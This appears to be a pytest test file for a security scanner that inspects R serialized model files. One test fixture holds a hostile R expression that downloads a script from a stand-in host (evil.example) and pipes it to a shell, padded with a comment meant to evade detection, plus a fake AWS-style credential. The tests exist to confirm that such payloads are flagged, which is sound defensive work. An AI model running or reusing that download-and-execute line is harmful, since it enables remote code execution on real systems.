from __future__ import annotations

import gzip
from pathlib import Path

from modelaudit.scanners import get_scanner_for_file
from modelaudit.scanners.base import Check, CheckStatus, IssueSeverity, ScanResult
from modelaudit.scanners.r_serialized_scanner import RSerializedScanner
from modelaudit.utils.file.detection import detect_file_format, detect_format_from_extension


def _write_raw_r_serialized(path: Path, body: str, *, workspace_header: bool = False) -> None:
    prefix = "RDX2\nX\n" if workspace_header else "X\n"
    path.write_bytes((prefix + body).encode("utf-8"))


def _write_gzip_r_serialized(path: Path, body: str, *, workspace_header: bool = True) -> None:
    payload_prefix = "RDX2\nX\n" if workspace_header else "X\n"
    with gzip.open(path, "wb") as stream:
        stream.write((payload_prefix + body).encode("utf-8"))


def _check_by_name(result: ScanResult, name: str) -> list[Check]:
    return [check for check in result.checks if check.name == name]


def test_can_handle_raw_rds_signature(tmp_path: Path) -> None:
    path = tmp_path / "safe.rds"
    _write_raw_r_serialized(path, "model\nlm\ncoefficients")

    assert RSerializedScanner.can_handle(str(path))


def test_can_handle_compressed_rdata_signature(tmp_path: Path) -> None:
    path = tmp_path / "workspace.rdata"
    _write_gzip_r_serialized(path, "workspace\nmodel_a\nmodel_b")

    assert RSerializedScanner.can_handle(str(path))


def test_wrong_extension_with_no_signature_is_not_handled(tmp_path: Path) -> None:
    path = tmp_path / "payload.bin"
    path.write_bytes(b"not-an-r-serialized-object")

    assert not RSerializedScanner.can_handle(str(path))


def test_scan_benign_rds_model_does_not_raise_critical(tmp_path: Path) -> None:
    path = tmp_path / "benign.rds"
    _write_raw_r_serialized(
        path,
        "\n".join(
            [
                "model",
                "glm",
                "feature_systematic_score",
                "evaluation_metric",
                "parse_date_feature",
            ]
        ),
    )

    result = RSerializedScanner().scan(str(path))

    assert result.success is True
    assert all(check.severity != IssueSeverity.CRITICAL for check in result.checks)

    symbol_checks = _check_by_name(result, "Executable Symbol Context Analysis")
    assert len(symbol_checks) == 1
    assert symbol_checks[0].status == CheckStatus.PASSED


def test_scan_benign_rdata_workspace_passes_signature_and_context_checks(tmp_path: Path) -> None:
    path = tmp_path / "workspace.rda"
    _write_raw_r_serialized(path, "workspace\nmodel_one\nmodel_two", workspace_header=True)

    result = RSerializedScanner().scan(str(path))

    signature_checks = _check_by_name(result, "R Serialization Signature")
    assert len(signature_checks) == 1
    assert signature_checks[0].status == CheckStatus.PASSED

    payload_checks = _check_by_name(result, "Serialized Expression Payload Detection")
    assert len(payload_checks) == 1
    assert payload_checks[0].status == CheckStatus.PASSED


def test_scan_detects_malicious_expression_and_bypass_noise(tmp_path: Path) -> None:
    path = tmp_path / "malicious.rdata"
    _write_raw_r_serialized(
        path,
        "\n".join(
            [
                "expression",
                "language",
                "base::system('curl https://evil.example/payload.sh # harmless comment | sh')",
                "AKIAABCDEFGHIJKLMNOP",
            ]
        ),
        workspace_header=True,
    )

    result = RSerializedScanner().scan(str(path))

    symbol_checks = _check_by_name(result, "Executable Symbol Context Analysis")
    assert len(symbol_checks) == 1
    assert symbol_checks[0].status == CheckStatus.FAILED
    assert symbol_checks[0].severity == IssueSeverity.CRITICAL

    payload_checks = _check_by_name(result, "Serialized Expression Payload Detection")
    assert len(payload_checks) == 1
    assert payload_checks[0].status == CheckStatus.FAILED
    assert payload_checks[0].severity == IssueSeverity.CRITICAL

    network_checks = _check_by_name(result, "Embedded Network Indicator Detection")
    assert len(network_checks) == 1
    assert network_checks[0].status == CheckStatus.FAILED

    credential_checks = _check_by_name(result, "Credential-like String Detection")
    assert len(credential_checks) == 1
    assert credential_checks[0].status == CheckStatus.FAILED


def test_scan_doc_heavy_content_with_risky_words_is_not_critical(tmp_path: Path) -> None:
    path = tmp_path / "docs_only.rds"
    _write_raw_r_serialized(
        path,
        "\n".join(
            [
                "# documentation: this model report mentions system and eval terms",
                "# description: parse values for evaluation tables only",
                "# comment: no function invocation should run",
            ]
        ),
    )

    result = RSerializedScanner().scan(str(path))

    critical_checks = [check for check in result.checks if check.severity == IssueSeverity.CRITICAL]
    assert critical_checks == []

    symbol_checks = _check_by_name(result, "Executable Symbol Context Analysis")
    assert len(symbol_checks) == 1
    assert symbol_checks[0].status == CheckStatus.PASSED


def test_scan_corrupt_gzip_stream_is_handled_fail_closed(tmp_path: Path) -> None:
    path = tmp_path / "corrupt.rds"
    path.write_bytes(b"\x1f\x8b\x08\x00\x00\x00")

    assert RSerializedScanner.can_handle(str(path))
    result = RSerializedScanner().scan(str(path))

    assert result.success is False
    decompression_checks = _check_by_name(result, "R Serialized Decompression")
    assert len(decompression_checks) == 1
    assert decompression_checks[0].status == CheckStatus.FAILED


def test_r_serialized_routes_through_detection_and_registry(tmp_path: Path) -> None:
    path = tmp_path / "model.rdata"
    _write_raw_r_serialized(path, "workspace\nmodel", workspace_header=True)

    assert detect_file_format(str(path)) == "r_serialized"
    assert detect_format_from_extension(str(path)) == "r_serialized"

    scanner = get_scanner_for_file(str(path))
    assert scanner is not None
    assert scanner.name == "r_serialized"
